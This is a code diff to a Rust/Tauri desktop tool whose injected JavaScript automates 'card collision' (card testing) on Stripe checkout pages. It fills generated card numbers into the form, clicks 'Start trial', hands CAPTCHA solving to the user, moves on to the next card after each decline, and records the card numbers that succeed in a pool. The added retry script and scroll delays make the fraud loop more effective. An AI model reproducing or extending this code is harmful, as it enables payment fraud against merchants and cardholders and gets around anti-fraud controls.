@@ -1,4 +1,4 @@
-use tauri::{command, AppHandle, WebviewWindowBuilder, WebviewUrl, Manager, Listener, State};
+use tauri::{command, AppHandle, WebviewWindowBuilder, WebviewUrl, Manager, Listener, State, Emitter};
 use std::process::Command;
 use std::sync::Arc;
 use crate::utils::card_generator::{CardGenerator, VirtualCard};
@@ -691,7 +691,6 @@ async fn inject_card_info_internal(
                         
                         // 通过修改 URL hash 发送成功信号（包含当前BIN）
                         window.location.hash = '#___PAYMENT_SUCCESS___BIN_' + currentBin;
-                        document.title = '___PAYMENT_SUCCESS___';
                         console.log('[AutoFill] 已发送成功信号，当前BIN:', currentBin);
                         return;
                     }}
@@ -1262,11 +1261,17 @@ pub async fn inject_simple_card_fill(
 
             function simulateTyping(element, value) {{
                 if (!element) return;
-                const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
-                element.focus();
-                setter.call(element, value);
-                element.dispatchEvent(new Event('input', {{ bubbles: true }}));
-                element.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                // 滚动到元素位置
+                element.scrollIntoView({{ behavior: 'smooth', block: 'center' }});
+                // 等待滚动完成
+                setTimeout(function() {{
+                    const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
+               
+                    element.focus();
+                    setter.call(element, value);
+                    element.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                    element.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                }}, 300);
             }}
 
             function waitForElement(selector, callback, timeout) {{
@@ -1884,17 +1889,22 @@ pub async fn inject_card_collision_script(
             // React 兼容的输入模拟
             function simulateTyping(element, value) {{
                 if (!element) return;
-                var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
-                element.focus();
-                setter.call(element, '');
-                element.dispatchEvent(new Event('input', {{ bubbles: true }}));
-                element.dispatchEvent(new Event('change', {{ bubbles: true }}));
-                // 短暂延迟后填入新值
+                // 滚动到元素位置
+                element.scrollIntoView({{ behavior: 'smooth', block: 'center' }});
+                // 等待滚动完成
                 setTimeout(function() {{
-                    setter.call(element, value);
+                    var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
+                    element.focus();
+                    setter.call(element, '');
                     element.dispatchEvent(new Event('input', {{ bubbles: true }}));
                     element.dispatchEvent(new Event('change', {{ bubbles: true }}));
-                }}, 50);
+                    // 短暂延迟后填入新值
+                    setTimeout(function() {{
+                        setter.call(element, value);
+                        element.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                        element.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                    }}, 50);
+                }}, 300);
             }}
 
             // 等待元素出现
@@ -1982,7 +1992,12 @@ pub async fn inject_card_collision_script(
                 
                 var cardEl = document.querySelector('#cardNumber') || document.querySelector('input[name="cardNumber"]') || document.querySelector('input[placeholder*="1234"]');
                 if (cardEl) {{
-                    simulateTyping(cardEl, cardNum);
+                    // 滚动到卡号输入框位置
+                    cardEl.scrollIntoView({{ behavior: 'smooth', block: 'center' }});
+                    // 等待滚动完成后再填写
+                    setTimeout(function() {{
+                        simulateTyping(cardEl, cardNum);
+                    }}, 300);
                 }}
             }}
 
@@ -2028,15 +2043,22 @@ pub async fn inject_card_collision_script(
 
             // 点击提交按钮
             function clickSubmit() {{
+            
                 return new Promise(function(resolve) {{
                     var checkReady = function() {{
                         var btn = document.querySelector('button[type="submit"]');
                         if (btn) {{
                             var isComplete = btn.classList.contains('SubmitButton--complete');
                             if (isComplete && !btn.disabled) {{
-                                console.log('[撞卡] ✓ 提交按钮就绪，点击提交');
-                                btn.click();
-                                resolve(true);
+                                console.log('[撞卡] ✓ 提交按钮就绪，滚动到提交按钮');
+                                // 滚动到提交按钮位置
+                                btn.scrollIntoView({{ behavior: 'smooth', block: 'center' }});
+                                // 等待滚动完成后再点击
+                                setTimeout(function() {{
+                                    console.log('[撞卡] 点击提交按钮');
+                                    btn.click();
+                                    resolve(true);
+                                }}, 300);
                                 return;
                             }}
                         }}
@@ -2061,24 +2083,12 @@ pub async fn inject_card_collision_script(
 
             // 检测页面上的错误信息
             function detectError() {{
-                // 检查各种错误元素
-                var selectors = [
-                    '.ConfirmPaymentButton-Error',
-                    '.FieldError',
-                    '.Error',
-                    '.Notice-message',
-                    '.Notice--red',
-                    '[class*="error"]',
-                    '[class*="Error"]',
-                    'p[role="alert"]'
-                ];
-                for (var i = 0; i < selectors.length; i++) {{
-                    var els = document.querySelectorAll(selectors[i]);
-                    for (var j = 0; j < els.length; j++) {{
-                        var text = els[j].textContent.trim();
-                        if (text.length > 0 && text.length < 200) {{
-                            return text;
-                        }}
+                // 只检查 FieldError-container 的样式
+                var errorContainer = document.querySelector('.FieldError-container');
+                if (errorContainer) {{
+                    var style = errorContainer.getAttribute('style') || '';
+                    if (style.indexOf('opacity: 1;') > -1) {{
+                        return 'error'; // 返回错误标识
                     }}
                 }}
                 return '';
@@ -2139,13 +2149,11 @@ pub async fn inject_card_collision_script(
                     if (preClass === 'invalid') {{
                         // 卡号无效，不提交，直接试下一个
                         console.log('[撞卡] ⚠️ 卡号无效: ' + formatCardNumber(cardNum) + '，跳过提交');
-                        document.title = '[撞卡] 卡号无效，跳过: ' + formatCardNumber(cardNum);
                         currentAttempt++;
                         if (currentAttempt < MAX_ATTEMPTS) {{
                             setTimeout(startCollision, 500);
                         }} else {{
                             console.log('[撞卡] ❌ 已达到最大尝试次数');
-                            document.title = '[撞卡] 已达最大次数 ' + MAX_ATTEMPTS;
                             window.location.hash = '#___COLLISION_EXHAUSTED___';
                         }}
                         return;
@@ -2153,7 +2161,6 @@ pub async fn inject_card_collision_script(
 
                     // 卡号有效，提交
                     console.log('[撞卡] 卡号有效，准备提交...');
-                    document.title = '[撞卡] 提交中: ' + formatCardNumber(cardNum);
 
                     clickSubmit().then(function(submitted) {{
                         if (!submitted) {{
@@ -2199,7 +2206,6 @@ pub async fn inject_card_collision_script(
                     var bodyText = document.body ? document.body.innerText.trim() : '';
                     if (bodyText.indexOf('500') !== -1 && bodyText.indexOf('Internal Server Error') !== -1) {{
                         console.log('[撞卡] ⚠️ 检测到500服务器错误页面，标记关闭');
-                        document.title = '[撞卡] 500错误，关闭窗口';
                         window.location.hash = '#___COLLISION_500_ERROR___';
                         return;
                     }}
@@ -2207,7 +2213,6 @@ pub async fn inject_card_collision_script(
                     // 检查成功
                     if (detectSuccess()) {{
                         console.log('[撞卡] ✅✅✅ 绑卡成功！卡号: ' + formatCardNumber(lastFilledCard));
-                        document.title = '[撞卡] ✅ 成功: ' + formatCardNumber(lastFilledCard);
                         window.location.hash = '#___COLLISION_SUCCESS___CARD_' + lastFilledCard;
                         return;
                     }}
@@ -2216,7 +2221,6 @@ pub async fn inject_card_collision_script(
                     if (isCaptchaVisible()) {{
                         if (!captchaLogged) {{
                             console.log('[撞卡] 🔐 检测到人机验证弹窗，等待用户完成验证...');
-                            document.title = '[撞卡] 等待人机验证...';
                             captchaLogged = true;
                         }}
                         // 验证弹窗期间重置超时计时器
@@ -2228,7 +2232,6 @@ pub async fn inject_card_collision_script(
                     // 验证弹窗已消失
                     if (captchaLogged) {{
                         console.log('[撞卡] ✓ 人机验证已完成，继续检测结果...');
-                        document.title = '[撞卡] 验证完成，等待结果...';
                         captchaLogged = false;
                         // 验证完成后给Stripe一些处理时间
                         resultCheckStart = Date.now();
@@ -2244,13 +2247,11 @@ pub async fn inject_card_collision_script(
                         if (errorType === 'declined') {{
                             // 被拒绝，换下一个卡号
                             console.log('[撞卡] 🔄 卡被拒绝，换下一个卡号');
-                            document.title = '[撞卡] 被拒绝，换卡: ' + formatCardNumber(lastFilledCard);
                             currentAttempt++;
                             if (currentAttempt < MAX_ATTEMPTS) {{
                                 setTimeout(startCollision, 1500);
                             }} else {{
                                 console.log('[撞卡] ❌ 已达到最大尝试次数');
-                                document.title = '[撞卡] 已达最大次数 ' + MAX_ATTEMPTS;
                                 window.location.hash = '#___COLLISION_EXHAUSTED___';
                             }}
                             return;
@@ -2441,4 +2442,591 @@ pub async fn generate_collision_cards_batch(
     }
     
     Ok(cards)
+}
+
+/// 注入撞卡模式的重试脚本：检测错误并自动切换卡号
+#[command]
+pub async fn inject_collision_retry_script(
+    app: AppHandle,
+    collision_store: State<'_, Arc<CollisionStore>>,
+    window_label: String,
+    card_numbers: Vec<String>,  // 该窗口的30个卡号列表
+    expiry_date: String,
+    cvv: String,
+    cardholder_name: String,
+) -> Result<(), String> {
+    let window = app.get_webview_window(&window_label)
+        .ok_or("Window not found".to_string())?;
+    
+    // 将卡号列表转换为 JavaScript 数组
+    let cards_json = serde_json::to_string(&card_numbers).map_err(|e| e.to_string())?;
+    
+    let js_code = format!(r#"
+        (function() {{
+            'use strict';
+            console.log('[CollisionRetry] 撞卡重试脚本已注入');
+            
+            var cardNumbers = {cards_json};
+            var currentCardIndex = 0;
+            var stopped = false;
+            var lastFilledCard = '';
+            
+            // React 兼容的输入模拟（参照 inject_card_collision_script）
+            function simulateTyping(element, value) {{
+                if (!element) return;
+                // 滚动到元素位置
+                element.scrollIntoView({{ behavior: 'smooth', block: 'center' }});
+
+                // 等待滚动完成
+                setTimeout(function() {{
+                    var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
+                
+                    element.focus();
+                    // setter.call(element, '');
+                    // element.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                    // element.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                    // 短暂延迟后填入新值
+                        setter.call(element, value);
+                        element.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                        element.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                }}, 800);
+            }}
+            
+            // 格式化卡号
+            function formatCardNumber(num) {{
+                return num.replace(/(\d{{4}})/g, '$1 ').trim();
+            }}
+            
+            // 检查提交按钮是否显示"开始试用"
+            function isSubmitButtonReady() {{
+                try {{
+                    var textContainer = document.querySelector('.SubmitButton-TextContainer');
+                    if (textContainer) {{
+                        var spans = textContainer.querySelectorAll('span');
+                        if (spans.length > 0) {{
+                            var buttonText = spans[0].innerText;
+                            return buttonText === '开始试用' || buttonText === 'Start trial';
+                        }}
+                    }}
+                }} catch (e) {{
+                    console.error('[CollisionRetry] 检查按钮文本时出错:', e);
+                }}
+                return false;
+            }}
+            
+            // 填写卡号（只更新卡号字段）
+            function fillCardNumber(cardNum) {{
+                lastFilledCard = cardNum.replace(/\s/g, '');
+                var formatted = formatCardNumber(lastFilledCard);
+                console.log('[CollisionRetry] 填写卡号: ' + formatted + ' (第' + (currentCardIndex + 1) + '/' + cardNumbers.length + '个)');
+         
+                var cardEl = document.querySelector('#cardNumber') || 
+                            document.querySelector('input[name="cardNumber"]') ||
+                            document.querySelector('input[placeholder*="1234"]');
+                if (cardEl) {{
+                    // 滚动到卡号输入框位置
+                    cardEl.scrollIntoView({{ behavior: 'smooth', block: 'center' }});
+                    // 等待滚动完成后再填写
+                    setTimeout(function() {{
+                        simulateTyping(cardEl, lastFilledCard);
+                    }}, 800);
+                }}
+            }}
+            
+            // 检查表单是否已填好
+            function isFormReady() {{
+                // 检查是否有验证弹框
+                if (isCaptchaVisible()) {{
+                    console.log('[CollisionRetry] ⚠️ 检测到验证弹框，不提交');
+                    return false;
+                }}
+                
+                // 检查是否有表单错误
+                var error = detectError();
+                if (error) {{
+                    console.log('[CollisionRetry] ⚠️ 检测到表单错误: ' + error + '，不提交');
+                    return false;
+                }}
+                
+                // 检查提交按钮状态
+                var btn = document.querySelector('button[type="submit"]');
+                if (!btn) {{
+                    console.log('[CollisionRetry] ⚠️ 提交按钮未找到');
+                    return false;
+                }}
+                
+                // 检查按钮是否包含 complete 类名（表示表单已填好）
+                var isComplete = btn.classList.contains('SubmitButton--complete');
+                if (!isComplete) {{
+                    console.log('[CollisionRetry] ⚠️ 表单未填好（按钮未complete），不提交');
+                    return false;
+                }}
+                
+                // 检查按钮是否被禁用
+                if (btn.disabled) {{
+                    console.log('[CollisionRetry] ⚠️ 提交按钮被禁用，不提交');
+                    return false;
+                }}
+                
+                return true;
+            }}
+            
+            // 点击提交按钮
+            function clickSubmit() {{
+                return new Promise(function(resolve) {{
+                    // 检查提交按钮是否显示"开始试用"
+                    if (!isSubmitButtonReady()) {{
+                        console.log('[CollisionRetry] ⚠️ 提交按钮未显示"开始试用"，不提交');
+                        resolve(false);
+                        return;
+                    }}
+
+                    var checkReady = function() {{
+                        // 检查表单是否已填好且没有验证弹框
+                        if (!isFormReady()) {{
+                            // 等待表单填好，最多等30秒
+                            if (Date.now() - startWait < 30000) {{
+                                setTimeout(checkReady, 500);
+                            }} else {{
+                                console.log('[CollisionRetry] ⏳ 等待表单就绪超时');
+                                resolve(false);
+                            }}
+                            return;
+                        }}
+                        
+                        // 表单已就绪，可以提交
+                        var btn = document.querySelector('button[type="submit"]');
+                        if (btn) {{
+                            console.log('[CollisionRetry] ✓ 表单已填好且无验证弹框，滚动到提交按钮');
+                            // 滚动到提交按钮位置
+                            btn.scrollIntoView({{ behavior: 'smooth', block: 'center' }});
+                            // 等待滚动完成后再点击
+                            setTimeout(function() {{
+                                console.log('[CollisionRetry] 点击提交按钮');
+                              
+                                btn.click();
+                                resolve(true);
+                            }}, 300);
+                        }} else {{
+                            resolve(false);
+                        }}
+                    }};
+                    var startWait = Date.now();
+                    checkReady();
+                }});
+            }}
+            
+            // 检测页面上的错误信息（参照 inject_card_collision_script）
+            function detectError() {{
+                // 检查各种错误元素
+                // 只检查 FieldError-container 的样式
+                var errorContainer = document.querySelector('.FieldError-container');
+                if (errorContainer) {{
+                    var style = errorContainer.getAttribute('style') || '';
+                    if (style.indexOf('opacity: 1;') > -1) {{
+                        return 'error'; // 返回错误标识
+                    }}
+                }}
+                return '';
+            }}
+            
+            // 判断错误类型
+            function classifyError(errorText) {{
+                if (!errorText) return 'none';
+                // 卡号无效
+                if (errorText.indexOf('无效') >= 0 || errorText.indexOf('invalid') >= 0 ||
+                    errorText.indexOf('Invalid') >= 0 || errorText.indexOf('incorrect') >= 0 ||
+                    errorText.indexOf('not valid') >= 0) {{
+                    return 'invalid';
+                }}
+                // 被拒绝
+                if (errorText.indexOf('拒绝') >= 0 || errorText.indexOf('declined') >= 0 ||
+                    errorText.indexOf('Declined') >= 0 || errorText.indexOf('decline') >= 0 ||
+                    errorText.indexOf('refused') >= 0 || errorText.indexOf('reject') >= 0) {{
+                    return 'declined';
+                }}
+                // 其他错误也当作拒绝处理（尝试换卡）
+                return 'declined';
+            }}
+            
+            // 检测是否绑卡成功
+            function detectSuccess() {{
+                var btn = document.querySelector('button[type="submit"]');
+                if (btn) {{
+                    var hasSuccess = btn.classList.contains('SubmitButton--success');
+                    var hasCheckmark = btn.querySelector('.SubmitButton-CheckmarkIcon--current');
+                    if (hasSuccess || hasCheckmark) return true;
+                }}
+                return false;
+            }}
+            
+            // 检测是否正在进行人机验证（参照 inject_card_collision_script）
+            function isCaptchaVisible() {{
+                // 检查reCAPTCHA challenge iframe（大尺寸的验证弹窗，非隐藏的badge小图标）
+                var frames = document.querySelectorAll('iframe[src*="recaptcha"], iframe[src*="hcaptcha"], iframe[title*="recaptcha"], iframe[title*="reCAPTCHA"], iframe[title*="challenge"]');
+                for (var i = 0; i < frames.length; i++) {{
+                    var rect = frames[i].getBoundingClientRect();
+                    // reCAPTCHA challenge弹窗通常较大（>100px），隐藏的badge很小
+                    if (rect.width > 100 && rect.height > 100) {{
+                        return true;
+                    }}
+                }}
+                return false;
+            }}
+            
+            // 等待提交后的结果（使用递归 setTimeout，参照 inject_card_collision_script）
+            function waitForResult() {{
+                if (stopped) return;
+                
+                var resultCheckStart = Date.now();
+                var lastError = '';
+                var captchaLogged = false;
+                var RESULT_TIMEOUT = 120000; // 2分钟超时
+                
+                var checkResult = function() {{
+                    if (stopped) return;
+                    
+                    // 检查500服务器错误页面
+                    var bodyText = document.body ? document.body.innerText.trim() : '';
+                    if (bodyText.indexOf('500') !== -1 && bodyText.indexOf('Internal Server Error') !== -1) {{
+                        console.log('[CollisionRetry] ⚠️ 检测到500服务器错误页面，标记关闭');
+                       
+                        window.location.hash = '#___COLLISION_RETRY_500_ERROR___';
+                        return;
+                    }}
+                    
+                    // 检查成功
+                    if (detectSuccess()) {{
+                        console.log('[CollisionRetry] ✅✅✅ 绑卡成功！卡号: ' + formatCardNumber(lastFilledCard));
+                       
+                        window.location.hash = '#___COLLISION_RETRY_SUCCESS___CARD_' + lastFilledCard;
+                        return;
+                    }}
+                    
+                    // 检测reCAPTCHA弹窗是否可见
+                    if (isCaptchaVisible()) {{
+                        if (!captchaLogged) {{
+                            console.log('[CollisionRetry] 🔐 检测到人机验证弹窗，等待用户完成验证...');
+                          
+                            captchaLogged = true;
+                        }}
+                        // 验证弹窗期间重置超时计时器
+                        resultCheckStart = Date.now();
+                        setTimeout(checkResult, 1000);
+                        return;
+                    }}
+                    
+                    // 验证弹窗已消失
+                    if (captchaLogged) {{
+                        console.log('[CollisionRetry] ✓ 人机验证已完成，继续检测结果...');
+                        captchaLogged = false;
+                        // 验证完成后给Stripe一些处理时间
+                        resultCheckStart = Date.now();
+                    }}
+                    
+                    // 检查错误信息（只有检测到错误提示才换下一个卡号）
+                    var error = detectError();
+                    if (error && error !== lastError) {{
+                        lastError = error;
+                        var errorType = classifyError(error);
+                        console.log('[CollisionRetry] ❌ 检测到错误提示: ' + error + ' (类型: ' + errorType + ')');
+                        
+                        // 有错误提示，发送失败信号并换下一个卡号
+                        console.log('[CollisionRetry] 🔄 有错误提示，换下一个卡号');
+                        
+                        // 发送失败信号，通知后端添加已撞卡号
+                        window.location.hash = '#___COLLISION_RETRY_FAILED___CARD_' + lastFilledCard;
+                        
+                        currentCardIndex++;
+                        if (currentCardIndex >= cardNumbers.length) {{
+                            console.log('[CollisionRetry] ❌ 所有卡号已用完');
+                            window.location.hash = '#___COLLISION_RETRY_EXHAUSTED___';
+                            return;
+                        }}
+                        
+                        // 等待一下让错误提示消失，然后调用 startRetry 继续循环（增加等待时间，避免服务器错误）
+                        setTimeout(function() {{
+                            if (stopped) return;
+                            // 直接调用 startRetry，它会填写卡号并提交
+                            startRetry();
+                        }}, 4000); // 等待4秒让错误提示消失，并给服务器足够时间处理
+                        return;
+                    }}
+                    
+                    // 超时检查（人机验证期间已重置计时器）
+                    if (Date.now() - resultCheckStart > RESULT_TIMEOUT) {{
+                        console.log('[CollisionRetry] ⏳ 等待结果超时，换下一个卡号');
+                        
+                        // 发送失败信号
+                        window.location.hash = '#___COLLISION_RETRY_FAILED___CARD_' + lastFilledCard;
+                        
+                        currentCardIndex++;
+                        if (currentCardIndex < cardNumbers.length) {{
+                            // 等待一下让错误提示消失，然后调用 startRetry 继续循环（增加等待时间，避免服务器错误）
+                            setTimeout(function() {{
+                                if (stopped) return;
+                                // 直接调用 startRetry，它会填写卡号并提交
+                                startRetry();
+                            }}, 4000); // 等待4秒让错误提示消失，并给服务器足够时间处理
+                        }} else {{
+                            window.location.hash = '#___COLLISION_RETRY_EXHAUSTED___';
+                        }}
+                        return;
+                    }}
+                    
+                    // 递归检查（使用 setTimeout 而不是 setInterval）
+                    setTimeout(checkResult, 500);
+                }};
+                
+                // 等待3秒让Stripe处理
+                setTimeout(checkResult, 3000);
+            }}
+            
+            // 主循环：重试逻辑
+            function startRetry() {{
+                if (stopped) return;
+                
+                if (currentCardIndex >= cardNumbers.length) {{
+                    console.log('[CollisionRetry] ❌ 所有卡号已用完');
+                    window.location.hash = '#___COLLISION_RETRY_EXHAUSTED___';
+                    return;
+                }}
+                
+                // 检查提交按钮是否显示"开始试用"，只有显示时才填写卡号
+                if (!isSubmitButtonReady()) {{
+                    console.log('[CollisionRetry] ⏳ 等待提交按钮显示"开始试用"...');
+                    // 等待按钮状态改变，最多等30秒
+                    var waitStart = Date.now();
+                    var checkButton = function() {{
+                        if (stopped) return;
+                        if (isSubmitButtonReady()) {{
+                            console.log('[CollisionRetry] ✓ 提交按钮已显示"开始试用"，开始填写卡号');
+                            // 按钮已就绪，继续填写卡号
+                            var cardNum = cardNumbers[currentCardIndex];
+                            console.log('[CollisionRetry] === 第 ' + (currentCardIndex + 1) + '/' + cardNumbers.length + ' 个卡号 ===');
+                            fillCardNumber(cardNum);
+                            // 继续后续流程
+                            continueAfterFill(cardNum);
+                        }} else if (Date.now() - waitStart < 30000) {{
+                            // 继续等待
+                            setTimeout(checkButton, 500);
+                        }} else {{
+                            console.log('[CollisionRetry] ⏳ 等待按钮显示"开始试用"超时');
+                            // 超时后尝试继续
+                            var cardNum = cardNumbers[currentCardIndex];
+                            console.log('[CollisionRetry] === 第 ' + (currentCardIndex + 1) + '/' + cardNumbers.length + ' 个卡号 ===');
+                            fillCardNumber(cardNum);
+                            continueAfterFill(cardNum);
+                        }}
+                    }};
+                    checkButton();
+                    return;
+                }}
+                
+                // 按钮已显示"开始试用"，可以填写卡号
+                var cardNum = cardNumbers[currentCardIndex];
+                console.log('[CollisionRetry] === 第 ' + (currentCardIndex + 1) + '/' + cardNumbers.length + ' 个卡号 ===');
+                
+                // 填写卡号
+                fillCardNumber(cardNum);
+                
+                // 继续后续流程
+                continueAfterFill(cardNum);
+            }}
+            
+            // 填写卡号后的后续流程
+            // 流程：1) 等待卡号填入完成 → 2) 检查是否有错误提示（有则换卡，不提交）
+            //      3) 无错误则提交一次 → 4) 结果交给 waitForResult 处理（出现错误再换下一张卡）
+            function continueAfterFill(cardNum) {{
+                // 等待卡号填好，让前端完成本地校验
+                setTimeout(function() {{
+                    if (stopped) return;
+
+                    // 1. 检查是否有错误提示（例如「卡号无效」等）
+                    var error = detectError();
+                    if (error) {{
+                        console.log('[CollisionRetry] ⚠️ 填写后立即检测到错误提示，不提交，换下一个卡号。错误内容:', error);
+                        document.title = '[CollisionRetry] 错误，换卡: ' + formatCardNumber(cardNum);
+
+                        // 标记当前卡失败（不提交）
+                        window.location.hash = '#___COLLISION_RETRY_FAILED___CARD_' + cardNum.replace(/\\s/g, '');
+
+                        // 切换到下一张卡
+                        currentCardIndex++;
+                        if (currentCardIndex < cardNumbers.length) {{
+                            setTimeout(startRetry, 1500);
+                        }} else {{
+                            console.log('[CollisionRetry] ❌ 所有卡号已用完');
+                            window.location.hash = '#___COLLISION_RETRY_EXHAUSTED___';
+                        }}
+                        return;
+                    }}
+
+                    // 2. 没有错误提示，可以提交当前卡
+                    console.log('[CollisionRetry] 卡号已填好，准备提交...');
+                    document.title = '[CollisionRetry] 提交中: ' + formatCardNumber(cardNum);
+
+                    // 只提交一次，后续错误处理统一交给 waitForResult
+                    clickSubmit().then(function(submitted) {{
+                        if (submitted) {{
+                            // 进入结果等待与错误检测环节
+                            waitForResult();
+                        }} else {{
+                            console.log('[CollisionRetry] 提交失败，直接换下一个卡号');
+                            currentCardIndex++;
+                            if (currentCardIndex < cardNumbers.length) {{
+                                setTimeout(startRetry, 1500);
+                            }} else {{
+                                window.location.hash = '#___COLLISION_RETRY_EXHAUSTED___';
+                            }}
+                        }}
+                    }});
+                }}, 2000); // 等2秒让前端完成本地校验
+            }}
+            
+            // 等待提交按钮点击后开始重试
+            var submitCheckInterval = setInterval(function() {{
+                if (window.__AUTO_SUBMIT_FIRST_CLICK_TIME__) {{
+                    clearInterval(submitCheckInterval);
+                    console.log('[CollisionRetry] 检测到提交按钮已点击，开始重试');
+                    setTimeout(startRetry, 2000);
+                }}
+            }}, 500);
+            
+            // 如果10秒后还没检测到点击，直接开始重试
+            setTimeout(function() {{
+                clearInterval(submitCheckInterval);
+                if (!window.__AUTO_SUBMIT_FIRST_CLICK_TIME__) {{
+                    console.log('[CollisionRetry] 超时，直接开始重试');
+                    setTimeout(startRetry, 2000);
+                }}
+            }}, 10000);
+        }})();
+    "#,
+        cards_json = cards_json,
+    );
+    
+    window.eval(&js_code).map_err(|e| {
+        eprintln!("[CollisionRetry] 执行JS失败: {}", e);
+        e.to_string()
+    })?;
+    
+    println!("[CollisionRetry] 撞卡重试脚本已注入到窗口: {}", window_label);
+    
+    // 启动后台监控：监听窗口 hash 变化
+    let window_for_monitor = window.clone();
+    let window_label_clone = window_label.clone();
+    let collision_store_clone = collision_store.inner().clone();
+    let app_clone = app.clone();
+    
+    tokio::spawn(async move {
+        println!("[CollisionRetry] 开始监控重试结果...");
+        let mut check_count = 0;
+        let max_checks = 1200; // 最多600秒（每500ms一次，1200次 = 600秒 = 10分钟）
+        
+        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
+        
+        loop {
+            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
+            check_count += 1;
+            
+            if check_count > max_checks {
+                println!("[CollisionRetry] 监控超时，停止");
+                break;
+            }
+            
+            if !window_for_monitor.is_visible().unwrap_or(false) {
+                println!("[CollisionRetry] 窗口已关闭，停止监控");
+                break;
+            }
+            
+            // 检查窗口 hash（通过 URL 获取）
+            if let Ok(url) = window_for_monitor.url() {
+                let url_str = url.to_string();
+                
+                // 处理失败信号：添加已撞卡号
+                if url_str.contains("___COLLISION_RETRY_FAILED___") {
+                    if let Some(card_start) = url_str.find("CARD_") {
+                        let card_part = &url_str[card_start + 5..];
+                        let card_number: String = card_part.chars()
+                            .take_while(|c| c.is_ascii_digit())
+                            .take(16)
+                            .collect();
+                        if !card_number.is_empty() {
+                            println!("[CollisionRetry] 检测到失败卡号: {}", card_number);
+                            if let Err(e) = collision_store_clone.add_card(&card_number).await {
+                                eprintln!("[CollisionRetry] 添加已撞卡号失败: {}", e);
+                            }
+                        }
+                    }
+                }
+                
+                // 处理成功信号：添加卡号到卡池和已撞仓库
+                if url_str.contains("___COLLISION_RETRY_SUCCESS___") {
+                    if let Some(card_start) = url_str.find("CARD_") {
+                        let card_part = &url_str[card_start + 5..];
+                        let card_number: String = card_part.chars()
+                            .take_while(|c| c.is_ascii_digit())
+                            .take(16)
+                            .collect();
+                        if !card_number.is_empty() {
+                            println!("[CollisionRetry] ✅ 重试成功！卡号: {}", card_number);
+                            
+                            // 添加到已撞仓库
+                            if let Err(e) = collision_store_clone.add_card(&card_number).await {
+                                eprintln!("[CollisionRetry] 添加已撞卡号失败: {}", e);
+                            }
+                            
+                            // 通过事件通知前端添加到卡池
+                            if let Err(e) = app_clone.emit("collision-card-success", json!({
+                                "window_label": window_label_clone,
+                                "card_number": card_number
+                            })) {
+                                eprintln!("[CollisionRetry] 发送成功事件失败: {}", e);
+                            }
+                        }
+                    }
+                    // 成功后不自动关闭窗口，让用户看到结果
+                    tokio::time::sleep(tokio::time::Duration::from_secs(3)).await;
+                    let _ = window_for_monitor.close();
+                    break;
+                }
+                
+                // 处理耗尽信号
+                if url_str.contains("___COLLISION_RETRY_EXHAUSTED___") {
+                    println!("[CollisionRetry] ❌ 所有卡号已用完: {}", window_label_clone);
+                    break;
+                }
+                
+                // 处理500错误信号
+                if url_str.contains("___COLLISION_RETRY_500_ERROR___") {
+                    println!("[CollisionRetry] ⚠️ 检测到500服务器错误(hash信号)，关闭窗口: {}", window_label_clone);
+                    let _ = window_for_monitor.close();
+                    break;
+                }
+            }
+            
+            // 每3秒通过JS检测一次500错误页面（兜底检测，防止页面跳转后JS脚本丢失）
+            if check_count % 6 == 0 {
+                let _ = window_for_monitor.eval(
+                    "try { var t = document.body ? document.body.innerText.trim() : ''; if (t.indexOf('500') !== -1 && t.indexOf('Internal Server Error') !== -1) { window.location.hash = '___COLLISION_RETRY_500_ERROR___'; } } catch(e) {}"
+                );
+                tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
+                if let Ok(url) = window_for_monitor.url() {
+                    let url_str = url.to_string();
+                    if url_str.contains("___COLLISION_RETRY_500_ERROR___") {
+                        println!("[CollisionRetry] ⚠️ 检测到500服务器错误(页面内容检测)，关闭窗口: {}", window_label_clone);
+                        let _ = window_for_monitor.close();
+                        break;
+                    }
+                }
+            }
+            
+            if check_count % 20 == 0 {
+                println!("[CollisionRetry] 监控中... ({}/{})", check_count, max_checks);
+            }
+        }
+    });
+    
+    Ok(())
 }
